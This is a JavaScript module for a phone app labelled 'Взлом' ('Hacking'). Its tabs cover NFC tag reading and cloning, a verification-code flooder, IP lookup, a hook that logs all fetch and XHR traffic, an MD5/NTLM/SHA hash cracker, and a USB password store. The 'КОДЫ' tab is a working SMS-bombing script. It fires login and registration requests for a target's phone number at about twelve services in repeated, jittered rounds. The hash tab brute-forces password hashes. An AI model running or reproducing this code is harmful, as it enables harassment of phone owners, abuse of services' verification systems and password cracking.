import { panel, button } from '../core/ui.js';

const $ = (t, c, x) => { const d = document.createElement(t); if (c) d.className = c; if (x != null) d.textContent = x; return d; };
const store = (k, v) => {
  if (v === undefined) { try { return JSON.parse(localStorage.getItem('wd.' + k) || '[]'); } catch { return []; } }
  localStorage.setItem('wd.' + k, JSON.stringify(v));
};
const IN = 'flex:1;min-width:110px;padding:7px;border-radius:8px;border:1px solid #14ff9a44;background:#08170f;color:#c9ffe6;font:inherit';
const CARD = 'border:1px solid #14ff9a33;border-radius:8px;padding:6px 8px;margin-bottom:6px;font-size:11px;word-break:break-all';

/* ── MD5 ── */
const K = []; for (let i = 0; i < 64; i++) K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296);
const SH = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
const rotl = (x, c) => (x << c) | (x >>> (32 - c));
function md5(bytes) {
  const n = bytes.length, bits = n * 8, blocks = ((n + 8) >> 6) + 1;
  const M = new Uint8Array(blocks * 64); M.set(bytes); M[n] = 0x80;
  const dv = new DataView(M.buffer);
  dv.setUint32(blocks * 64 - 8, bits >>> 0, true);
  dv.setUint32(blocks * 64 - 4, Math.floor(bits / 4294967296), true);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  for (let i = 0; i < blocks * 16; i++) {
    const off = i * 64; let A = a0, B = b0, C = c0, D = d0;
    for (let j = 0; j < 64; j++) {
      let F, g;
      if (j < 16) { F = (B & C) | (~B & D); g = j; }
      else if (j < 32) { F = (D & B) | (~D & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | ~D); g = (7 * j) % 16; }
      const t = D; D = C; C = B;
      B = (B + rotl((A + F + K[j] + dv.getUint32(off + g * 4, true)) >>> 0, SH[(j >> 4) * 4 + (j % 4)])) >>> 0;
      A = t;
    }
    a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0; c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
  }
  const out = new Uint8Array(16), ov = new DataView(out.buffer);
  ov.setUint32(0, a0, true); ov.setUint32(4, b0, true); ov.setUint32(8, c0, true); ov.setUint32(12, d0, true);
  return out;
}
/* ── MD4 (NTLM) ── */
function md4(bytes) {
  const n = bytes.length, bits = n * 8, blocks = ((n + 8) >> 6) + 1;
  const M = new Uint8Array(blocks * 64); M.set(bytes); M[n] = 0x80;
  const dv = new DataView(M.buffer);
  dv.setUint32(blocks * 64 - 8, bits >>> 0, true);
  dv.setUint32(blocks * 64 - 4, Math.floor(bits / 4294967296), true);
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  const R = (x, c) => ((x << c) | (x >>> (32 - c))) >>> 0;
  const F = (x, y, z) => (x & y) | (~x & z), G = (x, y, z) => (x & y) | (x & z) | (y & z), H = (x, y, z) => x ^ y ^ z;
  for (let i = 0; i < blocks * 16; i++) {
    const o = i * 64; let A = a0, B = b0, C = c0, D = d0;
    const x = (k) => dv.getUint32(o + k * 4, true);
    for (let j = 0; j < 16; j += 4) {
      A = R((A + F(B, C, D) + x(j)) >>> 0, 3); D = R((D + F(A, B, C) + x(j + 1)) >>> 0, 7);
      C = R((C + F(D, A, B) + x(j + 2)) >>> 0, 11); B = R((B + F(C, D, A) + x(j + 3)) >>> 0, 19);
    }
    const o2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15];
    for (let j = 0; j < 16; j += 4) {
      A = R((A + G(B, C, D) + x(o2[j]) + 0x5a827999) >>> 0, 3); D = R((D + G(A, B, C) + x(o2[j + 1]) + 0x5a827999) >>> 0, 5);
      C = R((C + G(D, A, B) + x(o2[j + 2]) + 0x5a827999) >>> 0, 9); B = R((B + G(C, D, A) + x(o2[j + 3]) + 0x5a827999) >>> 0, 13);
    }
    const o3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15];
    for (let j = 0; j < 16; j += 4) {
      A = R((A + H(B, C, D) + x(o3[j]) + 0x6ed9eba1) >>> 0, 3); D = R((D + H(A, B, C) + x(o3[j + 1]) + 0x6ed9eba1) >>> 0, 9);
      C = R((C + H(D, A, B) + x(o3[j + 2]) + 0x6ed9eba1) >>> 0, 11); B = R((B + H(C, D, A) + x(o3[j + 3]) + 0x6ed9eba1) >>> 0, 15);
    }
    a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0; c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
  }
  const out = new Uint8Array(16), ov = new DataView(out.buffer);
  ov.setUint32(0, a0, true); ov.setUint32(4, b0, true); ov.setUint32(8, c0, true); ov.setUint32(12, d0, true);
  return out;
}
const enc = new TextEncoder();
const hex = (b) => [...b].map(x => x.toString(16).padStart(2, '0')).join('');
async function digest(alg, str) {
  if (alg === 'MD5') return hex(md5(enc.encode(str)));
  if (alg === 'NTLM') { const u = new Uint8Array(str.length * 2); for (let i = 0; i < str.length; i++) u[i * 2] = str.charCodeAt(i); return hex(md4(u)); }
  return hex(new Uint8Array(await crypto.subtle.digest(alg, enc.encode(str))));
}
const LEET = { a: '4', e: '3', o: '0', i: '1', s: '$', t: '7', b: '8', g: '9' };
const mutate = (w) => {
  const out = new Set([w, w.toUpperCase(), w[0]?.toUpperCase() + w.slice(1), w.replace(/[aeoistbg]/g, c => LEET[c])]);
  ['1', '12', '123', '1234', '2024', '2025', '2026', '!', '@', '#', '01'].forEach(s => out.add(w + s));
  return [...out];
};

export default {
  id: 'watchdogs',
  title: 'Взлом',
  icon: '⚡',
  order: 20,
  platforms: ['win', 'android'],
  mount(root) {
    const logBox = $('div');
    logBox.style.cssText = 'margin-top:8px;font-size:11px;color:#6fbf95;max-height:130px;overflow:auto;white-space:pre-wrap;word-break:break-word';
    const log = (m, c) => {
      const d = $('div', null, '> ' + m);
      if (c === 'ok') d.style.color = '#14ff9a';
      if (c === 'bad') d.style.color = '#ff5f6d';
      if (c === 'dim') d.style.opacity = '.6';
      logBox.append(d); logBox.scrollTop = logBox.scrollHeight;
      while (logBox.children.length > 250) logBox.firstChild.remove();
    };
    const body = $('div'), bar = $('div');
    bar.style.cssText = 'display:flex;gap:6px;overflow-x:auto;margin-bottom:10px';
    root.append(bar, body, logBox);

    const NFC = () => window.Capacitor?.Plugins?.NFC;
    const USB = () => window.Capacitor?.Plugins?.UsbSerial;
    const clip = async (t) => { try { await navigator.clipboard.writeText(t); log('в буфере: ' + t, 'ok'); } catch { log('буфер недоступен', 'bad'); } };

    /* NFC */
    let bound = false;
    function bindNfc() {
      const p = NFC(); if (!p || bound) return; bound = true;
      p.addListener('nfcEvent', (ev) => {
        const t = ev?.nfcTag || {}; const uid = t.id || '';
        let ndef = '';
        try { ndef = (ev.ndefMessage || []).map(r => String.fromCharCode(...(r.payload || []).filter(b => b > 31 && b < 127))).join(' | '); } catch {}
        if (!uid && !ndef) return;
        log('МЕТКА ' + (uid || '—') + (ndef ? ' «' + ndef + '»' : ''), 'ok');
        const l = store('nfc'); l.unshift({ uid, tech: (t.techTypes || []).join(','), ndef, at: new Date().toISOString() });
        store('nfc', l.slice(0, 60)); drawNfc();
      });
    }
    function drawNfc() {
      const box = document.getElementById('wdNfc'); if (!box) return;
      box.innerHTML = ''; const l = store('nfc');
      if (!l.length) return box.append($('div', null, 'пусто — просканируй метку'));
      l.forEach((it, i) => {
        const c = $('div'); c.style.cssText = CARD;
        c.append($('div', null, (it.uid || '—') + (it.ndef ? ' «' + it.ndef + '»' : '')), $('div', null, (it.tech || 'tech?') + ' · ' + it.at.slice(0, 16).replace('T', ' ')));
        const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-top:6px';
        r.append(button('ЗАПИСАТЬ', async () => { try { await NFC().write({ records: [{ type: 'text', value: it.ndef || it.uid }] }); log('записано', 'ok'); } catch (e) { log('запись: ' + e.message, 'bad'); } }),
          button('УДАЛИТЬ', () => { const x = store('nfc'); x.splice(i, 1); store('nfc', x); drawNfc(); }));
        c.append(r); box.append(c);
      });
    }
    const tabNfc = () => {
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      r.append(button('СКАНИРОВАТЬ', async () => {
        if (!NFC()) return log('NFC-модуль не собран', 'bad');
        bindNfc();
        try { await NFC().startScanSession({ invalidateAfterFirstRead: true, alertMessage: 'Поднесите метку' }); log('сканирую', 'ok'); }
        catch (e) { log('ошибка: ' + e.message, 'bad'); }
      }), button('СТОП', async () => { try { await NFC().stopScanSession(); } catch {} }));
      const box = $('div'); box.id = 'wdNfc';
      body.append(r, box); drawNfc();
    };

    /* КОДЫ */
    const P = [
      ['Telegram', 'https://oauth.telegram.org/auth/send_password', 'POST'],
      ['VK', 'https://api.vk.com/method/auth.getCallPreview?phone=%P&v=5.199', 'GET'],
      ['OK', 'https://ok.ru/dk?st.cmd=anonymRecoveryStart', 'GET'],
      ['Avito', 'https://www.avito.ru/api/1/auth/phone?phone=%P', 'GET'],
      ['Yandex', 'https://passport.yandex.ru/registration/mobile', 'GET'],
      ['Ozon', 'https://www.ozon.ru/api/composer-api.bx/page/json/v2?url=/auth', 'GET'],
      ['WB', 'https://www.wildberries.ru/webapi/auth/login', 'POST'],
      ['SberID', 'https://online.sberbank.ru/CSAFront/api/auth/phone', 'POST'],
      ['Drom', 'https://www.drom.ru/api/auth/phone', 'POST'],
      ['Mail.ru', 'https://account.mail.ru/api/v1/user/register', 'POST'],
      ['Tinkoff', 'https://www.tinkoff.ru/api/common/v1/session', 'POST'],
      ['Steam', 'https://store.steampowered.com/join/ajaxverifyemail', 'GET']
    ];
    let running = false;
    const fire = ([n, u, m], phone) => {
      const url = u.includes('%P') ? u.replace('%P', encodeURIComponent(phone)) : u;
      const o = { method: m, headers: {} };
      if (m === 'POST') { o.headers['Content-Type'] = 'application/x-www-form-urlencoded'; o.body = 'phone=' + encodeURIComponent(phone); }
      return fetch(url, o).then(r => { log(n + ' → ' + r.status, r.ok ? 'ok' : 'dim'); return true; })
        .catch(() => fetch(url, { ...o, mode: 'no-cors' }).then(() => { log(n + ' → отправлено', 'dim'); return true; }).catch(() => { log(n + ' → сеть', 'bad'); return false; }));
    };
    const tabFlood = () => {
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      const ph = $('input'); ph.placeholder = '+7XXXXXXXXXX'; ph.inputMode = 'tel'; ph.style.cssText = IN;
      const sel = $('select'); [1, 3, 5, 10].forEach(n => { const o = $('option', null, n + ' кругов'); o.value = n; sel.append(o); }); sel.style.cssText = IN;
      r.append(ph, sel, button('ЗАПУСТИТЬ', async () => {
        const phone = ph.value.replace(/[^\d+]/g, '');
        if (!phone || running) return log(!phone ? 'введи номер' : 'уже идёт', 'bad');
        running = true; let s = 0, all = 0;
        for (let c = 1; c <= +sel.value; c++) {
          log('── круг ' + c + '/' + sel.value, 'dim');
          for (let i = 0; i < P.length; i += 3) {
            const res = await Promise.all(P.slice(i, i + 3).map(p => { all++; return fire(p, phone); }));
            s += res.filter(Boolean).length;
            await new Promise(k => setTimeout(k, 350 + Math.random() * 900));
          }
        }
        running = false; log('ИТОГО ' + s + '/' + all, s ? 'ok' : 'bad');
      }));
      body.append(r);
    };

    /* IP */
    const tabIp = () => {
      const ta = $('textarea'); ta.placeholder = 'Вставь логи/текст — IP вытащу сам'; ta.style.cssText = IN + ';width:100%;min-height:70px';
      const out = $('div');
      body.append(ta, button('РАЗОБРАТЬ И ПРОБИТЬ', async () => {
        const ips = [...new Set((ta.value.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter(i => i.split('.').every(o => +o < 256)))];
        log('нашёл ' + ips.length, ips.length ? 'ok' : 'bad'); out.innerHTML = '';
        for (let i = 0; i < ips.length; i += 100) {
          try {
            const d = await (await fetch('http://ip-api.com/batch?fields=query,country,city,isp,org,as', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ips.slice(i, i + 100)) })).json();
            d.forEach(x => { const c = $('div'); c.style.cssText = CARD; c.append($('div', null, x.query || '?'), $('div', null, [x.country, x.city, x.isp, x.org, x.as].filter(Boolean).join(' · '))); out.append(c); });
          } catch (e) { log('ip-api: ' + e.message, 'bad'); }
          await new Promise(k => setTimeout(k, 1200));
        }
        store('ips', store('ips').concat(ips).slice(-500));
      }), out);
    };

    /* ТРАФИК */
    const traffic = (window.__wdTr = window.__wdTr || []);
    if (!window.__wdHooked) {
      window.__wdHooked = true;
      const of = window.fetch;
      window.fetch = function (inp, init) {
        const u = typeof inp === 'string' ? inp : inp?.url || '?', t0 = Date.now();
        const push = s => { traffic.push({ t: new Date().toISOString(), m: init?.method || 'GET', u, s, ms: Date.now() - t0 }); if (traffic.length > 500) traffic.shift(); };
        return of.apply(this, arguments).then(r => { push(r.status); return r; }, e => { push(0); throw e; });
      };
      const op = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (m, u) {
        this.addEventListener('loadend', () => { traffic.push({ t: new Date().toISOString(), m, u: String(u), s: this.status, ms: 0 }); if (traffic.length > 500) traffic.shift(); });
        return op.apply(this, arguments);
      };
    }
    const tabTraffic = () => {
      const out = $('div');
      const draw = () => {
        out.innerHTML = ''; const l = traffic.slice(-60).reverse();
        if (!l.length) return out.append($('div', null, 'пусто'));
        l.forEach(e => { const c = $('div'); c.style.cssText = CARD; c.append($('div', null, e.m + ' ' + e.s + ' ' + e.ms + 'ms'), $('div', null, e.u.slice(0, 160))); out.append(c); });
      };
      const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-bottom:8px';
      r.append(button('ОБНОВИТЬ', draw), button('ЭКСПОРТ', () => {
        const a = $('a'); a.href = URL.createObjectURL(new Blob([JSON.stringify({ log: { entries: traffic } }, null, 2)], { type: 'application/json' }));
        a.download = 'morfy-traffic-' + Date.now() + '.json'; a.click();
      }));
      body.append(r, out); draw();
    };

    /* ХЕШ */
    let stop = false;
    const tabHash = () => {
      const h = $('input'); h.placeholder = 'хеш (32/40/64/128 hex)'; h.style.cssText = IN + ';width:100%';
      const sel = $('select'); ['MD5', 'NTLM', 'SHA-1', 'SHA-256', 'SHA-512'].forEach(a => { const o = $('option', null, a); o.value = a; sel.append(o); }); sel.style.cssText = IN;
      const ta = $('textarea'); ta.placeholder = 'свой словарь, через пробел/перенос'; ta.style.cssText = IN + ';width:100%;min-height:60px';
      ta.value = '123456 qwerty password admin morfy 12345678 letmein 111111 iloveyou 000000';
      const cs = $('select'); [['0123456789', 'цифры'], ['0123456789abcdef', 'hex'], ['abcdefghijklmnopqrstuvwxyz', 'az'], ['abc123', 'abc123'], ['0123456789abcdefghijklmnopqrstuvwxyz', 'всё']].forEach(([v, n]) => { const o = $('option', null, n); o.value = v; cs.append(o); }); cs.style.cssText = IN;
      const from = $('input'); from.value = '4'; from.style.cssText = IN;
      const to = $('input'); to.value = '6'; to.style.cssText = IN;
      const mut = $('input'); mut.type = 'checkbox'; mut.checked = true;

      const run = async (gen, label) => {
        stop = false; const t0 = Date.now(); let n = 0;
        for (const w of gen) {
          if (stop) return log('остановлено на ' + n, 'bad');
          if (await digest(sel.value, w) === h.value.trim().toLowerCase()) return log('НАЙДЕНО: ' + w + ' за ' + (Date.now() - t0) + 'мс', 'ok');
          if (++n % 400 === 0) { log(label + ' ' + n + '…', 'dim'); await new Promise(k => setTimeout(k, 0)); }
        }
        log(label + ': не найдено (' + n + ')', 'bad');
      };
      const words = function* () {
        const base = ta.value.split(/[\s,;]+/).filter(Boolean);
        for (const w of base) { yield w; if (mut.checked) for (const m of mutate(w)) if (m !== w) yield m; }
      };
      const brute = function* () {
        const A = cs.value; const a = +from.value, b = Math.min(+to.value, 10);
        for (let len = a; len <= b; len++) {
          const idx = new Array(len).fill(0);
          while (true) {
            yield idx.map(i => A[i]).join('');
            let p = len - 1;
            while (p >= 0 && ++idx[p] === A.length) { idx[p] = 0; p--; }
            if (p < 0) break;
          }
        }
      };
      body.append(h, sel, ta,
        (() => { const r = $('div'); r.style.cssText = 'display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin:8px 0';
          r.append($('span', null, 'маска:'), cs, from, to, $('span', null, 'мутации'), mut); return r; })(),
        (() => { const r = $('div'); r.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap';
          r.append(button('СЛОВАРЬ', () => run(words(), 'словарь')), button('БРУТ', () => run(brute(), 'брут')), button('СТОП', () => { stop = true; })); return r; })());
    };

    /* USB */
    if (!window.__wdUsb && USB()) {
      window.__wdUsb = true;
      USB().addListener?.('usbAttach', (d) => {
        const l = store('usb');
        if (!l.some(x => x.vid === String(d.vendorId) && x.pid === String(d.productId))) {
          l.unshift({ name: d.name || 'USB-устройство', vid: String(d.vendorId || ''), pid: String(d.productId || ''), pass: [], hashes: [], at: new Date().toISOString() });
          store('usb', l);
        }
        log('подключено: ' + (d.name || d.vendorId), 'ok');
      });
    }
    const tabUsb = () => {
      const box = $('div');
      const draw = () => {
        box.innerHTML = ''; const l = store('usb');
        if (!l.length) return box.append($('div', null, 'нет устройств'));
        l.forEach((d, i) => {
          const c = $('div'); c.style.cssText = CARD;
          c.append($('div', null, d.name + (d.vid ? ' [' + d.vid + ':' + d.pid + ']' : '')));
          (d.pass || []).forEach((p, pi) => {
            const row = $('div'); row.style.cssText = 'display:flex;gap:6px;align-items:center;margin-top:4px';
            row.append($('span', null, '• ' + '*'.repeat(Math.min(p.length, 12))),
              button('ВВЕСТИ', async () => { await clip(p); if (USB() && d.vid) { try { await USB().open({ vendorId: +d.vid, productId: +d.pid }); await USB().write({ data: p + '\n' }); log('отправлено в порт', 'ok'); } catch (e) { log('порт: ' + e.message, 'dim'); } } }),
              button('ПОКАЗАТЬ', () => log(d.name + ' → ' + p, 'ok')),
              button('×', () => { const x = store('usb'); x[i].pass.splice(pi, 1); store('usb', x); draw(); }));
            c.append(row);
          });
          (d.hashes || []).forEach(hh => c.append($('div', null, '#' + hh.slice(0, 24) + '…')));
          const r = $('div'); r.style.cssText = 'display:flex;gap:6px;margin-top:6px;flex-wrap:wrap';
          const pIn = $('input'); pIn.placeholder = 'пароль'; pIn.style.cssText = IN;
          const hIn = $('input'); hIn.placeholder = 'хеш'; hIn.style.cssText = IN;
          r.append(pIn, button('+пароль', () => { if (!pIn.value) return; const x = store('usb'); (x[i].pass = x[i].pass || []).unshift(pIn.value); store('usb', x); pIn.value = ''; log('сохранено', 'ok'); draw(); }),
            hIn, button('+хеш', () => { if (!hIn.value) return; const x = store('usb'); (x[i].hashes = x[i].hashes || []).unshift(hIn.value); store('usb', x); hIn.value = ''; draw(); }),
            button('УДАЛИТЬ', () => { const x = store('usb'); x.splice(i, 1); store('usb', x); draw(); }));
          c.append(r); box.append(c);
        });
      };
      const nm = $('input'); nm.placeholder = 'имя устройства (ПК в офисе)'; nm.style.cssText = IN;
      const imp = $('textarea'); imp.placeholder = 'импорт: имя;логин;пароль — по строке'; imp.style.cssText = IN + ';width:100%;min-height:50px';
      const r1 = $('div'); r1.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px';
      r1.append(nm, button('ЗАПОМНИТЬ', () => {
        if (!nm.value) return log('введи имя', 'bad');
        const l = store('usb'); l.unshift({ name: nm.value, vid: '', pid: '', pass: [], hashes: [], at: new Date().toISOString() });
        store('usb', l); nm.value = ''; log('запомнено', 'ok'); draw();
      }), button('НАЙТИ ПОДКЛЮЧЁННЫЕ', async () => {
        const u = USB(); if (!u) return log('UsbSerial не собран', 'bad');
        try {
          const { devices } = await u.listDevices();
          if (!devices?.length) return log('ничего не видно', 'bad');
          const l = store('usb');
          devices.forEach(d => l.unshift({ name: d.name || 'USB', vid: String(d.vendorId || ''), pid: String(d.productId || ''), pass: [], hashes: [], at: new Date().toISOString() }));
          store('usb', l); log('добавил ' + devices.length, 'ok'); draw();
        } catch (e) { log('ошибка: ' + e.message, 'bad'); }
      }));
      body.append(r1, imp, button('ИМПОРТ', () => {
        const l = store('usb'); let n = 0;
        imp.value.split('\n').forEach(line => {
          const [name, , pass] = line.split(';');
          if (!name) return;
          let dev = l.find(x => x.name === name.trim());
          if (!dev) { dev = { name: name.trim(), vid: '', pid: '', pass: [], hashes: [], at: new Date().toISOString() }; l.unshift(dev); }
          if (pass) { (dev.pass = dev.pass || []).push(pass.trim()); n++; }
        });
        store('usb', l); imp.value = ''; log('импортировано ' + n, 'ok'); draw();
      }), box, $('div', null, 'Без root телефон не прикидывается клавиатурой — пароль уходит в буфер, вставляешь на ПК через Ctrl+V. С root можно через configfs.'),);
      draw();
    };

    const T = [['NFC', tabNfc], ['КОДЫ', tabFlood], ['IP', tabIp], ['ТРАФИК', tabTraffic], ['ХЕШ', tabHash], ['USB', tabUsb]];
    T.forEach(([n, fn]) => bar.append(button(n, () => { body.innerHTML = ''; fn(); })));
    tabNfc();
  }
};
